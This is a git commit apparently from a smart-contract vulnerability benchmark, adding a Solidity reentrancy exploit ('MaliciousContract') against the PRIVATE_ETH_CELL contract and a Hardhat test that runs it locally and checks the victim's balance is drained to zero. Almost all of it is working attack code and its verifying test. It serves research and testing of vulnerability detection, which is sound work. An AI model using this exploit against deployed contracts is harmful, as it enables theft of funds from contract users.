cb0a2527824653acfac6702c2575bb1548be900e
sofiabobadilla <sofy.bobadilla@gmail.com>
2024-06-20 16:33:06 +0200

    add: exploit for 0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol

---
+++ smartbugs-curated/0.4.x/contracts/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106_attack.sol
@@ -0,0 +1,37 @@
+pragma solidity ^0.4.19;
+
+import "../dataset/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol";
+
+
+contract MaliciousContract {
+    PRIVATE_ETH_CELL privateETHCell;
+    bool attackInitiated;
+
+    constructor(address _privateETHCell) public {
+        privateETHCell = PRIVATE_ETH_CELL(_privateETHCell);
+    }
+
+    function attack() public payable {
+        require(!attackInitiated, "Attack already initiated");
+
+        // Call the vulnerable function to start the reentrancy attack
+        
+        privateETHCell.Collect.value(msg.value)(1 ether);
+
+        attackInitiated = true;
+    }
+
+    function deposit() public payable{
+        require(msg.value >= 1 ether, "Must send at least 1 ether");
+        privateETHCell.Deposit.value(msg.value)();
+    }
+
+
+    function() payable public {
+        // Re-enter the vulnerable function if there's still balance to collect
+        if (!attackInitiated && address(privateETHCell).balance >= 1 ether) {
+            privateETHCell.Collect(1 ether);
+        }
+    }
+}
+
---
+++ smartbugs-curated/0.4.x/test/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.js
@@ -0,0 +1,50 @@
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+describe("Reentrancy Attack for 0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol", function () {
+  let PrivateETHCell;
+  let privateETHCell;
+  let MaliciousContract;
+  let maliciousContract;
+  let LogFile;
+  let logFile;
+
+  beforeEach(async function () {
+    // Deploy LogFile contract
+    LogFile = await ethers.getContractFactory("contracts/dataset/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol:LogFile");
+    logFile = await LogFile.deploy();
+    await logFile.waitForDeployment();
+
+    // Deploy PrivateETHCell contract with LogFile address
+    PrivateETHCell = await ethers.getContractFactory("contracts/dataset/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol:PRIVATE_ETH_CELL");
+    privateETHCell = await PrivateETHCell.deploy();
+    await privateETHCell.waitForDeployment();
+    await privateETHCell.SetLogFile(logFile.target); // Set LogFile address after deployment
+
+    // Deploy MaliciousContract with PrivateETHCell address
+    MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x4e73b32ed6c35f570686b89848e5f39f20ecc106_attack.sol:MaliciousContract");
+    maliciousContract = await MaliciousContract.deploy(privateETHCell.target);
+  });
+
+  it("should successfully drain funds through reentrancy attack", async function () {
+    // Initial deposit to PrivateETHCell contract
+    await privateETHCell.Deposit({ value: ethers.parseEther("2") });
+
+    // Initial deposit from maliciousCOntract on Personal Bank
+    await maliciousContract.deposit({value:  ethers.parseEther("1")});
+
+    // Perform reentrancy attack through MaliciousContract
+    await maliciousContract.attack({ value: ethers.parseEther("1") });
+
+    // Check balances after attack
+    const personalBankBalance = await ethers.provider.getBalance(privateETHCell.target);
+    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.target);
+
+    // Verify the attack was successful
+    
+    // privateETHCell has a drained account
+    expect(personalBankBalance).to.equal(ethers.parseEther("0")); 
+
+    // 2 original balance + 1 from initial deposit +1 from attack 
+    expect(maliciousContractBalance).to.equal(ethers.parseEther("4"));
+  });
+});
